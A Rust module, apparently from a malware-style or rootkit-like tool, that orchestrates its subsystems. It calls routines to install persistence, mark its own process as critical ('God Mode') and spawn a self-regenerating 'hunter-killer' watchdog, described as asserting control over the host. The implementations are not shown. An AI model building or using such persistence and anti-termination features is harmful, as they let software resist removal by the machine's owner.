use crate::{oracle, ghost, persistence, evasion, cleaning};
use ratatui::style::Color;
use tokio::sync::mpsc::Sender;
use crate::WorkerMsg;

pub struct Nexus;

impl Nexus {
    /// THE AWAKENING: Initialize all subsystems
    pub async fn awaken(tx: &Sender<WorkerMsg>) {
        // 1. Voice
        oracle::Oracle::speak_greeting();
        let _ = tx.send(WorkerMsg::Log("NEXUS".into(), "Neural Link Established.".into(), Color::Cyan)).await;

        // 2. Physical Manifestation
        ghost::Ghost::blink_leds();
        let _ = tx.send(WorkerMsg::Log("NEXUS".into(), "Physical Interface Bridged.".into(), Color::Cyan)).await;

        // 3. Immortality
        persistence::Persistence::install();
        if cleaning::SAFE_MODE {
             let _ = tx.send(WorkerMsg::Log("NEXUS".into(), "Persistence: Simulated.".into(), Color::Yellow)).await;
        } else {
             let _ = tx.send(WorkerMsg::Log("NEXUS".into(), "Persistence: ACTIVE.".into(), Color::Red)).await;
        }
    }

    /// DOMINION: Assert control over the host
    pub fn assert_dominion() {
        // 1. God Mode
        evasion::GodMode::make_critical(true);
        
        // 2. Sentinel (Hunter-Killer + Regeneration)
        evasion::Sentinel::spawn_watchdog();
    }

    /// RELINQUISH: Release control safely
    pub fn relinquish_control() {
        evasion::GodMode::make_critical(false);
    }
}
